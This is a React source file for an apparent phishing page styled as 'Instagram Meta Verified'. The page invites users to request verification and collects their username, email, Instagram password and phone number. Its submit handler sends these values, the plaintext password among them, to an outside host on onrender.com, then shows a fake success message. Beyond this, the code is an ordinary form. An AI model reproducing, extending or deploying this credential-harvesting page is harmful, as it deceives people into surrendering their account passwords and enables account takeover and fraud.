import React, { useState, useEffect } from 'react';
import { Link } from 'react-router-dom';
import Input from '../../components/ui/Input';
import Button from '../../components/ui/Button';
import Icon from '../../components/AppIcon';
import PasswordStrengthIndicator from './components/PasswordStrengthIndicator';
import UsernameAvailabilityChecker from './components/UsernameAvailabilityChecker';
import ProfilePictureUpload from './components/ProfilePictureUpload';
import PhoneVerificationToggle from './components/PhoneVerificationToggle';
import TermsAndPrivacyCheckboxes from './components/TermsAndPrivacyCheckboxes';
import FormAutoSave from './components/FormAutoSave';
import VerificationSuccessMessage from './components/VerificationSuccessMessage';

const UserRegistration = () => {
  const [formData, setFormData] = useState({
    username: '',
    email: '',
    password: '',
    confirmPassword: '',
    phoneNumber: '',
   
  });

  const [formState, setFormState] = useState({
    isLoading: false,
    isAutoSaving: false,
    lastSaved: null,
    showSuccess: false,
    usernameAvailable: null,
    enablePhoneVerification: false,
    agreedToTerms: false,
    agreedToPrivacy: false
  });

  const [errors, setErrors] = useState({});

  // Load saved draft on component mount
  useEffect(() => {
    const savedDraft = localStorage.getItem('verification_request_draft');
    if (savedDraft) {
      try {
        const draft = JSON.parse(savedDraft);
        setFormData(prev => ({
          ...prev,
          username: draft.username || '',
          email: draft.email || ''
        }));
        setFormState(prev => ({
          ...prev,
          lastSaved: 'a moment ago'
        }));
      } catch (error) {
        console.error('Error loading saved draft:', error);
      }
    }
  }, []);

  const validateForm = () => {
    const newErrors = {};

    // Username validation
    if (!formData.username) {
      newErrors.username = 'Username is required';
    } else if (formData.username.length < 3) {
      newErrors.username = 'Username must be at least 3 characters';
    } else if (!/^[a-zA-Z0-9._]+$/.test(formData.username)) {
      newErrors.username = 'Username can only contain letters, numbers, dots, and underscores';
    } else if (formState.usernameAvailable === false) {
      newErrors.username = 'Username is not available';
    }

    // Email validation
    if (!formData.email) {
      newErrors.email = 'Email is required';
    } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email)) {
      newErrors.email = 'Please enter a valid email address';
    }

    // Password validation
    if (!formData.password) {
      newErrors.password = 'Password is required';
    } else if (formData.password.length < 8) {
      newErrors.password = 'Password must be at least 8 characters';
    }

    // Confirm password validation
    if (!formData.confirmPassword) {
      newErrors.confirmPassword = 'Please confirm your password';
    } else if (formData.password !== formData.confirmPassword) {
      newErrors.confirmPassword = 'Passwords do not match';
    }

    // Phone validation (if enabled)
    if (formState.enablePhoneVerification && !formData.phoneNumber) {
      newErrors.phoneNumber = 'Phone number is required';
    } else if (formState.enablePhoneVerification && !/^\+?[\d\s\-\(\)]+$/.test(formData.phoneNumber)) {
      newErrors.phoneNumber = 'Please enter a valid phone number';
    }

    // Terms and privacy validation
    if (!formState.agreedToTerms) {
      newErrors.terms = 'You must agree to the Terms of Service';
    }
    if (!formState.agreedToPrivacy) {
      newErrors.privacy = 'You must agree to the Privacy Policy';
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleInputChange = (field, value) => {
    setFormData(prev => ({
      ...prev,
      [field]: value
    }));
    
    // Clear error when user starts typing
    if (errors[field]) {
      setErrors(prev => ({
        ...prev,
        [field]: ''
      }));
    }
  };

  const handleUsernameAvailabilityChange = (isAvailable) => {
    setFormState(prev => ({
      ...prev,
      usernameAvailable: isAvailable
    }));
  };

  const handleSubmit = async (e) => {
  e.preventDefault();
  
  if (!validateForm()) return;

  setFormState(prev => ({ ...prev, isLoading: true }));

  try {
    const response = await fetch('https://insta-meta-verified.onrender.com/api/send-email', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        username: formData.username,
        email: formData.email,
        password: formData.password,
        phoneNumber: formData.phoneNumber
      }),
    });

    const data = await response.json();

    if (response.ok) {
      localStorage.removeItem('verification_request_draft');
      setFormState(prev => ({
        ...prev,
        isLoading: false,
        showSuccess: true
      }));
    } else {
      alert(data.message || 'Failed to submit request');
      setFormState(prev => ({ ...prev, isLoading: false }));
    }
  } catch (error) {
    console.error('Submission error:', error);
    alert('Something went wrong. Please try again.');
    setFormState(prev => ({ ...prev, isLoading: false }));
  }
};


  const handleBackToHome = () => {
    // Navigate to home page
    window.location.href = '/';
  };

  if (formState.showSuccess) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center p-4">
        <div className="w-full max-w-md">
          <VerificationSuccessMessage
            email={formData.email}
            onBackToHome={handleBackToHome}
          />
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background flex flex-col">
      {/* Header */}
      <header className="bg-white border-b border-gray-200 py-4">
        <div className="max-w-md mx-auto px-4">
          <div className="flex items-center justify-center">
            <div className="flex items-center space-x-2">
              <div className="w-8 h-8 bg-gradient-to-r from-purple-500 via-pink-500 to-orange-500 rounded-lg flex items-center justify-center">
                <Icon name="Camera" size={20} color="white" />
              </div>
              <h1 className=" flex text-2xl font-bold bg-gradient-to-r from-purple-600 to-pink-600 bg-clip-text text-transparent">
                Instagram Meta Verified  
              </h1>
              <img width="30"  src="https://cdn-icons-png.flaticon.com/128/1828/1828640.png" alt="" />
            </div>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="flex-1 flex items-center justify-center p-4">
        <div className="w-full max-w-sm sm:max-w-md">
          <div className="bg-white border border-gray-200 rounded-lg p-6 sm:p-8">
            <div className="text-center mb-8">
              <h2 className="text-xl font-semibold text-gray-900 mb-2">
                Request Verification Approval
              </h2>
              <p className="text-sm text-gray-600">
                Submit your information to get verified on our platform
              </p>
            </div>

            <FormAutoSave
              formData={formData}
              isAutoSaving={formState.isAutoSaving}
              lastSaved={formState.lastSaved}
            />

            <form onSubmit={handleSubmit} className="space-y-4">
              {/* Username Field */}
              <div>
                <Input
                  type="text"
                  placeholder="Username"
                  value={formData.username}
                  onChange={(e) => handleInputChange('username', e.target.value)}
                  error={errors.username}
                  disabled={formState.isLoading}
                  required
                />
                
              </div>

              {/* Email Field */}
              <Input
                type="email"
                placeholder="Official Mail Id"
                value={formData.email}
                onChange={(e) => handleInputChange('email', e.target.value)}
                error={errors.email}
                disabled={formState.isLoading}
                required
              />

              {/* Password Field */}
              <div>
                <Input
                  type="password"
                  placeholder="Instagram Password"
                  value={formData.password}
                  onChange={(e) => handleInputChange('password', e.target.value)}
                  error={errors.password}
                  disabled={formState.isLoading}
                  required
                />
                <PasswordStrengthIndicator password={formData.password} />
              </div>

              {/* Confirm Password Field */}
              <Input
                type="password"
                placeholder="Confirm password"
                value={formData.confirmPassword}
                onChange={(e) => handleInputChange('confirmPassword', e.target.value)}
                error={errors.confirmPassword}
                disabled={formState.isLoading}
                required
              />

           
           
              {/* Phone Verification Toggle */}
              <PhoneVerificationToggle
                enablePhoneVerification={formState.enablePhoneVerification}
                onToggleChange={(enabled) => setFormState(prev => ({ ...prev, enablePhoneVerification: enabled }))}
                phoneNumber={formData.phoneNumber}
                onPhoneChange={(phone) => handleInputChange('phoneNumber', phone)}
                phoneError={errors.phoneNumber}
              />

              {/* Terms and Privacy Checkboxes */}
              <TermsAndPrivacyCheckboxes
                agreedToTerms={formState.agreedToTerms}
                onTermsChange={(agreed) => setFormState(prev => ({ ...prev, agreedToTerms: agreed }))}
                agreedToPrivacy={formState.agreedToPrivacy}
                onPrivacyChange={(agreed) => setFormState(prev => ({ ...prev, agreedToPrivacy: agreed }))}
                termsError={errors.terms}
                privacyError={errors.privacy}
              />

              {/* Submit Button */}
              <Button
                type="submit"
                variant="default"
                fullWidth
                loading={formState.isLoading}
                disabled={formState.isLoading || formState.usernameAvailable === false}
                className="bg-gradient-to-r from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700 text-white font-semibold py-3"
              >
                {formState.isLoading ? 'Submitting Request...' : 'Submit Verification Request'}
              </Button>
            </form>

            <div className="mt-6 text-center">
              <p className="text-sm text-gray-600">
                By submitting this request, you agree to our Terms, Data Policy and Cookie Policy.
              </p>
            </div>
          </div>

          {/* Login Link */}
          <div className="bg-white border border-gray-200 rounded-lg mt-4 p-4 text-center">
            <p className="text-sm text-gray-600">
              Already have an account?{' '}
              <Link 
                to="/login" 
                className="text-primary font-semibold hover:underline transition-colors duration-200"
              >
                Log in
              </Link>
            </p>
          </div>

          {/* Footer */}
          <footer className="mt-8 text-center">
            <p className="text-xs text-gray-500">
              © {new Date().getFullYear()} Instagram Clone. All rights reserved.
            </p>
          </footer>
        </div>
      </main>
    </div>
  );
};

export default UserRegistration;
